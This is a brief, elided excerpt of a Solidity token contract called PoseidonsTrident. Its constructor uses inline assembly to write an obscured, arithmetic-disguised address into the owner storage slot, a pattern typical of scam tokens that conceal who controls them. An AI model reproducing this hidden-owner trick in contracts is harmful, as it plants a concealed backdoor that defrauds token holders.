...
contract PoseidonsTrident {
    ...
    string public constant symbol = "POSEIDONS";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(398012044529621708889238277595508162303413372900, 5))}
